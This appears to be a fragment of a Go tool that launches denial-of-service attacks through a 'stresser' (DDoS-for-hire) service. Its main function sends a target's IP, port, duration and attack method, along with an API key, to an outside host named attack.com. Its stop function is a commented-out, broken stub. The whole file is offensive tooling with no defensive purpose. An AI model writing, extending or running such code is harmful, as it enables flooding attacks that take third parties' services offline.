package main

import (
	"fmt"
	"net/http"
)

func stresser_api_send(host string, port string, duration string, method string) {
	url := fmt.Sprintf("https://attack.com?ip=%s&port=%s&time=%s&method=%s&apikey=uwu", host, port, duration, method)
	http.Get(url)
}

func stresser_api_stop() {
	/*
		url := "https://&host=&port=&time=&method=stop"
		http.Get(url)
	*/
}
